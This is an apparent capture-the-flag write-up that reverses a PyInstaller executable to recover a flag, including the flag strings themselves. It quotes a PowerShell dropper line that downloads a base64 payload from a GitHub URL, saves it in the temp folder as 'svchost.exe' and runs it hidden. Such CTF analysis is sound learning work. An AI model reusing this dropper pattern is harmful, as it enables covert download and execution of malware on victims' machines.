<img width="585" height="537" alt="image" src="https://github.com/user-attachments/assets/3bf91138-400f-4daf-b43a-2083d60fdd08" />


Step 1: Download bin from previous challenge.

$ErrorActionPreference="SilentlyContinue" $cid="OPUCC{Du_B1st_GUt_G3nuuuGgg!!!}" $u="**https://raw.githubusercontent.com/WazuX/OIIA/refs/heads/main/DuBistGutGenug.bin**" $p="$env:TEMP\svchost.exe" $b64 = (New-Object Net.WebClient).DownloadString($u) [IO.File]::WriteAllBytes($p, [Convert]::FromBase64String($b64)) Start-Process -WindowStyle Hidden $p

Step 2: Decode from Base 64 to EXE

<pre>base64 -d DuBistGutGenug.bin > svchost.exe</pre>

Step 3: Download pyinstxractor

<pre>wget https://raw.githubusercontent.com/extremecoders-re/pyinstxtractor/master/pyinstxtractor.py</pre>

Step 4: Extract PyInstaller

<pre>python3 pyinstxtractor.py svchost.exe</pre>

Step 5: Use strings to find flag

<pre>cd svchost.exe_extracted
strings -a DuBistGutGenug.pyc | grep -i OPUCC</pre>

Step 6: Get the flag
